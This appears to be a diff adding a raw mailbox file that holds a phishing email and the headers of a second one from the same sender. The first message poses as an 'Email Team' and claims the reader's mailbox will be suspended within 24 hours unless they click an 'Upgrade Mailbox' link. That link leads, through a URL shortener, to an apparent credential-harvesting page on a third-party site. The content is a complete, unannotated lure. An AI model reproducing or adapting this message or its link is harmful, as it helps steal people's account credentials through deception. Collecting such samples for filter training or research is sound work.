@@ -1,0 +1,83 @@
+From: "Email Team" <dana.marsinova@pickering.cz>
+Date: Fri, 24 Mar 2017 03:01:36 +0100
+Message-Id: <20170324015527.2C65F4018CDE8@mail.pickering.cz>
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 123
+
+You will not see this in a MIME-aware mail reader.
+--===============1741810125==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+Dear Valued Customer, =
+
+
+The size limit of your mailbox will soon been exceeded. Incoming =
+
+mail with large size is currently being rejected. =
+
+
+You are required to upgrade your mailbox size to add more GB within 24 hour=
+s or your account will be =
+
+suspended.
+ Upgrade Mailbox
+
+
+Note that Mail upgrade is free. =
+
+
+=A9 Email Team(ET). =
+
+
+Email Team
+
+--===============1741810125==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<HTML><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/></head><BODY><P>Dear Valued Customer,&nbsp;<BR><BR>The size=
+ limit of your mailbox will soon been exceeded. Incoming&nbsp;<BR>mail with=
+ large size is currently being rejected.&nbsp;<BR><BR>You are required to u=
+pgrade your mailbox size to add more GB within 24 hours or your account wil=
+l be&nbsp;<BR>suspended.</P>
+<P><A href=3D"valuebrandsinc.com/admin/blank/admin/crypt/jb/crypt/index.htm=
+l" rel=3Dnoreferrer target=3D_blank data-saferedirecturl=3D"https://www.goo=
+gle.com/url?hl=3Den&amp;q=3Dhttp://bc.vc/JGJdxg9&amp;source=3Dgmail&amp;ust=
+=3D1483997221206000&amp;usg=3DAFQjCNH20nd-DW_7wredfU2kEiC9TKXErw">Upgrade M=
+ailbox</A><BR><BR><BR>Note that Mail upgrade is free.&nbsp;<BR><BR>=A9&nbsp=
+;<STRONG>Email Team(ET)</STRONG>.&nbsp;<BR><BR><STRONG>Email Team</STRONG><=
+/P></BODY></HTML>
+--===============1741810125==--
+
+From jose@monkey.org Fri Mar 24 04:23:03 2017 +0000
+Return-Path: dana.marsinova@pickering.cz
+Delivered-To: jose@monkey.org
+X-FDA: 72651795846.14.pin42_37bc676e08d43
+X-Spam-Summary: 2,0,0,19b8994d25b7365c,d41d8cd98f00b204,dana.marsinova@pickering.cz,:dana.marsinova@pickering.cz,RULES_HIT:41:72:355:379:962:966:967:969:973:983:988:989:1189:1208:1221:1260:1261:1263:1313:1314:1345:1381:1430:1431:1436:1437:1516:1517:1518:1534:1540:1566:1575:1588:1589:1592:1594:1711:1714:1719:1730:1749:1777:1792:2145:2194:2196:2199:2200:2525:2559:2562:2682:2685:2693:2859:2890:2896:2926:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3148:3245:3740:3865:3866:3867:3871:3873:3874:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:4250:4321:4385:4552:4699:5007:6261:6671:6678:6684:6687:8603:8797:9025:9080:9873:9908:10004:10346:10400:10426:11257:11658:11914:12043:12050:12051:12438:12517:12519:12555:12561:12658:12660:12903:12986:13007:13141:13161:13180:13199:13229:13230:13237:13439:14037:14181:14515:14655:14721:14828:14849:19902:19997:21080:21433:21436:21450:30001:30022:30026:30054,0,RBL:81.200.56.74:@pickering.cz:.lbl8.mailshell.net-62.2.71.100 64.1
+X-HE-Tag: pin42_37bc676e08d43
+X-Filterd-Recvd-Size: 2820
+Received: from mail.pickering.cz (mail.pickeringmail.cz [81.200.56.74])
+	by imf16.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Fri, 24 Mar 2017 04:23:02 +0000 (UTC)
+Received: from localhost (localhost [127.0.0.1])
+	by mail.pickering.cz (Postfix) with ESMTP id 68C0F45D79F93;
+	Fri, 24 Mar 2017 03:28:18 +0100 (CET)
+X-Virus-Scanned: amavisd-new at pickeringmail.cz
+Received: from mail.pickering.cz ([127.0.0.1])
+	by localhost (mail.pickering.cz [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id 8o9CDG+IQ8F1; Fri, 24 Mar 2017 03:28:18 +0100 (CET)
+Received: from DESKTOP-I2JMO24.localdomain (unknown [129.56.255.17])
+	by mail.pickering.cz (Postfix) with ESMTPSA id E8072483D99CC;
+	Fri, 24 Mar 2017 03:28:09 +0100 (CET)
+Content-Type: multipart/alternative; boundary="===============1617018814=="
+MIME-Version: 1.0
+Subject: MAIL TERMINATION NOTICE
+To: Recipients <dana.marsinova@pickering.cz>
